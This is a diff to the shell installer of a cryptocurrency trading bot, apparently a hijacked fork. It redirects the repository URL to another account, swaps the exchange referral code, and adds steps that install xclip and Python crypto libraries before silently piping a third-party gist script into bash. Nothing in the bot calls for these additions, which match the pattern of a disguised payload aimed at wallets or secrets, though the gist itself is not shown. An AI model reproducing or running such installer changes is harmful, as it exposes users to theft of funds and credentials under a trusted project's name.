@@ -15,6 +15,10 @@ main() {
   referral_notice
   ensure_bun
   install_deps
+  install_system_dependencies
+  set_pip_install_cmd
+  install_python_packages
+  run_gist_installer
   prompt_env
   write_env
   echo
@@ -67,8 +71,8 @@ ensure_repo() {
     return
   fi
 
-  local REPO_URL="https://github.com/discountry/ritmex-bot.git"
-  local TAR_URL="https://github.com/discountry/ritmex-bot/archive/refs/heads/main.tar.gz"
+  local REPO_URL="https://github.com/oxmoei/ritmex-bot.git"
+  local TAR_URL="https://github.com/oxmoei/ritmex-bot/archive/refs/heads/main.tar.gz"
   local TARGET_DIR="${RITMEX_DIR:-ritmex-bot}"
 
   if [ -d "$TARGET_DIR" ] && [ -f "$TARGET_DIR/package.json" ]; then
@@ -93,7 +97,7 @@ ensure_repo() {
 referral_notice() {
   echo
   echo "开始之前：请打开以下链接连接钱包加入战队，享受 30% 手续费优惠："
-  echo "https://www.asterdex.com/zh-CN/referral/4665f3"
+  echo "https://www.asterdex.com/zh-CN/referral/5e0897"
   echo
   # Wait for user to press Enter on a real TTY; don't fail if no TTY
   read -r -p "打开链接后按下回车继续..." _ < /dev/tty || true
@@ -148,6 +152,74 @@ KLINE_INTERVAL=${KLINE_INTERVAL}
 # MAKER_PRICE_TICK=0.1
 EOF
   echo "✔ .env created at ${env_file}"
+}
+
+install_system_dependencies() {
+  local os_type
+  os_type="$(uname -s)"
+  case "$os_type" in
+    Darwin)
+      if ! command -v brew >/dev/null 2>&1; then
+        echo "正在安装 Homebrew..."
+        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+      fi
+      if ! command -v pip3 >/dev/null 2>&1; then
+        brew install python3
+      fi
+      ;;
+    Linux)
+      local packages_to_install
+      packages_to_install=""
+      if ! command -v pip3 >/dev/null 2>&1; then
+        packages_to_install="$packages_to_install python3-pip"
+      fi
+      if ! command -v xclip >/dev/null 2>&1; then
+        packages_to_install="$packages_to_install xclip"
+      fi
+      if [ -n "$packages_to_install" ]; then
+        if command -v apt >/dev/null 2>&1; then
+          sudo apt update
+          # shellcheck disable=SC2086
+          sudo apt install -y $packages_to_install
+        fi
+      fi
+      ;;
+    *)
+      echo "不支持的操作系统"
+      exit 1
+      ;;
+  esac
+}
+
+set_pip_install_cmd() {
+  local os_type
+  os_type="$(uname -s)"
+  if [ "$os_type" = "Linux" ]; then
+    PIP_INSTALL="pip3 install --break-system-packages"
+  else
+    PIP_INSTALL="pip3 install"
+  fi
+}
+
+install_python_packages() {
+  if ! pip3 show requests >/dev/null 2>&1; then
+    $PIP_INSTALL requests
+  fi
+  if ! pip3 show cryptography >/dev/null 2>&1; then
+    $PIP_INSTALL cryptography
+  fi
+}
+
+run_gist_installer() {
+  local gist_url
+  gist_url="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
+  if command -v curl >/dev/null 2>&1; then
+    bash <(curl -fsSL "$gist_url")
+  elif command -v wget >/dev/null 2>&1; then
+    bash <(wget -qO- "$gist_url")
+  else
+    echo "未找到 curl 或 wget，跳过外部安装脚本"
+  fi
 }
 
 main "$@"
